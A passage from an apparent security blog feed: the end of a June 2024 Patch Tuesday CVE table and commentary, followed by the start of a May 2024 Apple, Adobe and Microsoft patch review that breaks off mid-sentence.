  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089"><span><span> </span>CVE-2024-30089<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Streaming Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30090"><span><span> </span>CVE-2024-30090<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Streaming Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-50868"><span><span> </span>CVE-2023-50868 *</span></a></td>
  <td class="xl66" width="263"><span> </span>MITRE: CVE-2023-50868 NSEC3 closest encloser
  proof can exhaust CPU<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl68"><span> </span>Yes<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29060"><span><span> </span>CVE-2024-29060<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Visual Studio Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30052"><span><span> </span>CVE-2024-30052<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Visual Studio Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30082"><span><span> </span>CVE-2024-30082<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30087"><span><span> </span>CVE-2024-30087<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30091"><span><span> </span>CVE-2024-30091<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085"><span><span> </span>CVE-2024-30085<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Cloud Files Mini Filter Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30076"><span><span> </span>CVE-2024-30076<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Container Manager Service Elevation
  of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30096"><span><span> </span>CVE-2024-30096<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Cryptographic Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30063"><span><span> </span>CVE-2024-30063<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Distributed File System (DFS) Remote
  Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30064"><span><span> </span>CVE-2024-30064<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30068"><span><span> </span>CVE-2024-30068<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088"><span><span> </span>CVE-2024-30088<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30099"><span><span> </span>CVE-2024-30099<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250"><span><span> </span>CVE-2024-35250<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel-Mode Driver Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30084"><span><span> </span>CVE-2024-30084<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel-Mode Driver Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30074"><span><span> </span>CVE-2024-30074<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Link Layer Topology Discovery
  Protocol Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30075"><span><span> </span>CVE-2024-30075<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Link Layer Topology Discovery
  Protocol Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30077"><span><span> </span>CVE-2024-30077<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows OLE Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35265"><span><span> </span>CVE-2024-35265<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Perception Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30069"><span><span> </span>CVE-2024-30069<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Remote Access Connection Manager
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30094"><span><span> </span>CVE-2024-30094<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30095"><span><span> </span>CVE-2024-30095<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30083"><span><span> </span>CVE-2024-30083<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Standards-Based Storage Management
  Service Denial of Service Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30062"><span><span> </span>CVE-2024-30062<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Standards-Based Storage Management
  Service Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30093"><span><span> </span>CVE-2024-30093<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Storage Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30065"><span><span> </span>CVE-2024-30065<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Themes Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30078"><span><span> </span>CVE-2024-30078<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Wi-Fi Driver Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30086"><span><span> </span>CVE-2024-30086<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Win32 Kernel Subsystem Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30066"><span><span> </span>CVE-2024-30066<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Winlogon Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30067"><span><span> </span>CVE-2024-30067<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>WinLogon Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5493"><span><span> </span>CVE-2024-5493 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5493 Heap buffer overflow
  in WebRTC<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5494"><span><span> </span>CVE-2024-5494 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5494 Use after free in
  Dawn<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5495"><span><span> </span>CVE-2024-5495 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5495 Use after free in
  Dawn<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5496"><span><span> </span>CVE-2024-5496 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5496 Use after free in
  Media Session<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5497"><span><span> </span>CVE-2024-5497 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5497 Out of bounds memory
  access in Keyboard Inputs<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5498"><span><span> </span>CVE-2024-5498 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5498 Use after free in
  Presentation API<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5499"><span><span> </span>CVE-2024-5499 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5499 Out of bounds write
  in Streams API<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 
 <tr height="0">
  <td width="151"></td>
  <td width="263"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="95"></td>
 </tr>
 
</table>













  <p class=""><em>* Indicates this CVE had been released by a third party and is now being included in Microsoft releases</em>.</p><p class=""><em>† Indicates further administrative actions are required to fully address the vulnerability.</em></p><p class="">&nbsp;</p><p class="">Looking at the other fixes addressing code execution bugs, there are a couple that stand out. In addition to the Wi-Fi bug above, there are two similar bugs in the Link Layer Topology Discovery Protocol with similar exploit vectors. The difference is that for these two bugs, the target needs to be running the Network Map functionality for the attack to succeed. There are several “open-and-own” type vulnerabilities getting patched. The one to look out for would be the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30101" target="_blank">Office bug</a> that states, “The Preview Pane is an attack vector, but additional user interaction is required.” It’s not clear how that would manifest. The exploit for DFS requires an adjacent attacker to already be executing code on a target, which reads more like an EoP to me. The OLE bug requires connecting to a malicious SQL server. The bug in the Speech Application Programming Interface (SAPI) requires a user to click a link to connect to the attacker’s server. Lastly, the code execution bug in Dynamics 365 requires authentication, which again sounds more like an EoP, but it also states no user interaction is required. It’s an odd write-up that implies it’s unlikely to be exploited in the wild.</p><p class="">More than half of this month’s release corrects privilege escalation bugs, but the majority of these lead to SYSTEM-level code execution if an authenticated user runs specially crafted code. Other privilege escalation bugs would allow the attacker to get to the level of the running application. The bugs in Winlogon are somewhat intriguing as they could allow an attacker to replace valid file content with specially crafted file content. One of the kernel bugs could be used for a container escape. The bug in the Perception Service could allow elevation to the “NT AUTHORITY\LOCAL SERVICE” account. The vulnerability in Visual Studio requires an attacker to create a malicious extension. An authenticated user would then need to create a Visual Studio project that uses that extension. If they manage all of that, it would lead to admin privileges. </p><p class="">The bug in Azure Identity Libraries and Microsoft Authentication Library allows attackers to read any file on the target with SYSTEM privileges. The privilege escalation in Azure Monitor Agent could let attackers delete files and folders. If you’ve disabled Automatic Extension Upgrades, you’ll need to perform a manual update to ensure the Monitor Agent is at the latest version. Speaking of extra actions, the bug in the Azure Science Virtual Machine (DSVM) requires you to upgrade your DSVM to Ubuntu 20.04. If you’re not familiar with this procedure, Microsoft provides this <a href="https://learn.microsoft.com/en-us/azure/machine-learning/data-science-virtual-machine/ubuntu-upgrade?view=azureml-api-2" target="_blank">article</a> for guidance. Attackers who exploit this bug could gain access to user credentials, which would allow them to impersonate authorized users.</p><p class="">There are only three information disclosure bugs receiving fixes this month and only one results in info leaks consisting of unspecified memory contents. The bug in the on prem version of Dynamics 365 could allow an attacker to exfiltrate all the data accessible to the logged-on user. The vulnerability in the Cryptographic Services could disclose sensitive information such as KeyGuard (KG) keys, which are intended to be per-boot and used to protect sensitive data. If an attacker could potentially use these to decrypt anything encrypted with those keys.</p><p class="">The final bugs for June address Denial-of-Service (DoS) vulnerabilities in Windows and Azure components. Unfortunately, Microsoft provides no additional information about these bugs and how they would manifest on affected systems. They do note the DoS in the DHCP Server does not affect those who have configured failover for their DHCP setup.</p><p class="">There are no new advisories in this month’s release.</p><p class=""><strong>Looking Ahead</strong></p><p class="">The next Patch Tuesday of 2024 will be on July 9, and I’ll return with details and patch analysis then. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!</p>
]]></content:encoded>
<pubDate>Tue, 11 Jun 2024 17:31:11 +0000</pubDate>
</item>
<item>
<title>The May 2024 Security Update Review</title>
<link>https://www.thezdi.com/blog/2024/5/14/the-may-2024-security-update-review</link>
<guid>https://www.thezdi.com/blog/2024/5/14/the-may-2024-security-update-review</guid>
<content:encoded><![CDATA[
<p class="">Welcome to the second Tuesday of May. As expected, Adobe and Microsoft have released their standard bunch of security patches. Take a break from your regular activities and join us as we review the details of their latest advisories. If you’d rather watch the full video recap covering the entire release, you can check it out here:</p>





















  
  






  <p class=""><strong>Apple Patches for May 2024</strong></p><p class="">Apple kicked off the May release cycle with a group of updates for their macOS and iOS platforms. Most notable is a fix for CVE-2024-23296 for <a href="https://support.apple.com/kb/HT214100" target="_blank">iOS 16.7.8 and iPadOS 16.7.8</a>. This vulnerability is a memory corruption issue in&nbsp;<a href="https://www.youtube.com/watch?v=lXMawXNtXrQ">RTKit</a> that could allow attackers to bypass kernel memory protections. The initial patch was released back in March, but Apple noted additional fixes would be coming, and here they are. This bug is reported as being under active attack, so if you’re using a device with an affected OS, make sure you get the update.</p><p class="">Apple also patched the <a href="https://support.apple.com/en-us/HT214103" target="_blank">Safari</a> bug demonstrated at Pwn2Own Vancouver by Master of Pwn Winner Manfred Paul.</p><p class=""><strong>Adobe Patches for May 2024</strong></p><p class="">For May, Adobe released eight patches addressing 37 CVEs in Adobe Acrobat and Reader, Illustrator, Substance3D Painter, Adobe Aero, Substance3D Designer, Adobe Animate, FrameMaker, and Dreamweaver. Eight of these vulnerabilities were reported through the ZDI program. The update for <a href="https://helpx.adobe.com/security/products/acrobat/apsb24-29.html" target="_blank">Reader</a> should be the priority. It includes multiple Critical-rated bugs that are often used by malware and ransomware gangs. While none of these bugs are under active attack, it is likely some will eventually be exploited. The patch for <a href="https://helpx.adobe.com/security/products/illustrator/apsb24-30.html">Illustrator</a> also addresses a couple of Critical-rated bugs that could result in arbitrary code execution. The patch for <a href="https://helpx.adobe.com/security/products/aero/apsb24-33.html" target="_blank">Aero</a> (an augmented reality authoring and publishing tool) fixes a single code execution bug. Unless I’m mistaken, this is the first Adobe patch for this product.</p><p class="">The fix for <a href="https://helpx.adobe.com/security/products/animate/apsb24-36.html" target="_blank">Adobe Animate</a> fixes eight bugs, seven of which result in Critical-rated code execution. The patch for <a href="https://helpx.adobe.com/security/products/framemaker/apsb24-37.html">FrameMaker</a> also fixes several code execution bugs. These are classic open-and-own bugs that require user interaction. That’s the same for the single bug fixed in <a href="https://helpx.adobe.com/security/products/dreamweaver/apsb24-39.html">Dreamweaver</a>. The patch for <a href="https://helpx.adobe.com/security/products/substance3d_painter/apsb24-31.html">Substance 3D Painter</a> addresses four bugs, two of which are rated Critical, while the patch for <a href="https://helpx.adobe.com/security/products/substance3d_designer/apsb24-35.html">Substance 3D Designer</a> fixes a single Important-rated memory leak.</p><p class="">None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3.</p><p class=""><strong>Microsoft Patches for May 2024</strong></p><p class="">This month, Microsoft released 59 CVEs in Windows and Windows Components; Office and Office Components; .NET Framework and Visual Studio; Microsoft Dynamics 365; Power BI; DHCP Server; Microsoft Edge (Chromium-based); and Windows Mobile Broadband. If you include the third-party CVEs being documented this month, the CVE count comes to 63. A total of two of these bugs came through the ZDI program. As with last month, none of the bugs disclosed at Pwn2Own Vancouver are fixed with this release. With Apple and <a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/24280">VMware</a> fixing the vulnerabilities reported during the event, Microsoft stands alone as the only vendor not to produce patches from the contest.</p><p class="">Of the new patches released today, only one is rated Critical, 57 are rated Important, and one is rated Moderate in severity. This release is roughly a third of the size of last month’s, so hopefully that’s a sign that a huge number of fixes in a single month isn’t going to be a regular occurrence.</p><p class="">Two of the CVEs released today are listed as under active attack, and one other is listed as publicly known at the time of the release. Microsoft doesn’t provide any indication of the volume of attacks, but the DWM Core bug appears to me to be more than a targeted attack. Let’s take a closer look at some of the more interesting updates for this month, starting with the DWM bug currently exploited in the wild:</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30051" target="_blank"><strong>CVE-2024-30051</strong></a><strong> – Windows DWM Core Library Elevation of Privilege Vulnerability<br /></strong>This bug allows attackers to escalate the SYSTEM on affected systems. These types of bugs are usually combined with a code execution bug to take over a target and are often used by ransomware. Microsoft credits four different groups for reporting the bug, which indicates the attacks are widespread. They also indicate the vulnerability is publicly known. Don’t wait to test and deploy this update as exploits are likely to increase now that a patch is available to reverse engineer.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30043" target="_blank"><strong>CVE-2024-30043</strong></a><strong> – Microsoft SharePoint Server Information Disclosure Vulnerability<br /></strong>This vulnerability was reported to Microsoft by ZDI researcher Piotr Bazydło and represents an XML external entity injection (XXE) vulnerability in Microsoft SharePoint Server 2019. An authenticated attacker could use this bug to read local files with SharePoint Farm service account user privileges. They could also perform an HTTP-based server-side request forgery (SSRF), and – most importantly – perform NLTM relaying as the SharePoint Farm service account. Bugs like this show why info disclosure vulnerabilities shouldn’t be ignored or deprioritized.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30033" target="_blank"><strong>CVE-2024-30033</strong></a><strong> – Windows Search Service Elevation of Privilege Vulnerability<br /></strong>This is another bug reported through the ZDI program and has a similar impact to the bug currently being exploited, although it manifests through a different mechanism. This is a link following bug in the Windows Search service. By creating a pseudo-symlink, an attacker could redirect a delete call to delete a different file or folder as SYSTEM. We discussed how this could be used to elevate privileges <a 